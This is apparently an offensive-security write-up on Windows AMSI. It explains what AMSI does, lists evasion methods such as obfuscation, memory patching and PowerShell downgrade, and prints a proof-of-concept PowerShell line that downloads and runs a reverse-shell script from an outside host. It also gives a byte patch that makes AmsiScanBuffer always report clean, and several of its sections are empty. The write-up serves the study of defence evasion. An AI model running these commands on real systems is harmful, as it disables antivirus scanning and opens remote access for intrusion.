## Table of Contents
- [**Outline**](#section-0)
- [**Antimalware Scan Interface Explanation**](#section-1)
- [ **Proof of Concept - Bypassing 2023 Windows 10 Pro AMSI**](#section-2)
- [ **Obfuscation Methodolgy Anlysis**](#section-3)
- [ **Credits & Reference**](#section-4)
## Outline 


## AMSI 
AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime

By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. This prevents arbitrary execution of code. Thus, when a script is about to be executed, it passes through AMSI, which scans the script's content for suspicious or malicious behavior. 

## AMSI Logic
When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.

AmsiScanBuffer()
AmsiScanString()
If a known signature is identified execution doesn’t initiate and a message appears that the script has been blocked by the antivirus software

# AMSI Bypass Technique
The following evasive techniques aim to avoid detection by antivirus and security software.  

Code Fragmentation: Divide codes into smaller components and assemble at runtime, evading static analysis.
Obfuscation: Utilize obfuscation techniques to obscure the true intent of the script, making it challenging for AMSI scanners to interpret the code accurately.
Memory patching: Modify the AMSI Dynamic Link Library (DLL) in memory to either disable or alter its functionality temporarily. 
Powershell Downgrade: Downgrade to Windows PowerShell 2.0. It lacks essential security controls like AMSI protection, making it susceptible to exploitation as a means of evasion.

## Proof of Concept
![](/assets/AV/Final.gif)   

```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
```


## Memory Patching
Daniel Duggan released an AMSI bypass which patches the AmsiScanBuffer() function in order to return always AMSI_RESULT_CLEAN which indicates that no detection has been found. The patch is displayed in the following line:
```bash 
static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
```




## Weaponization

## Reference
- Read team playbook, Offensive Security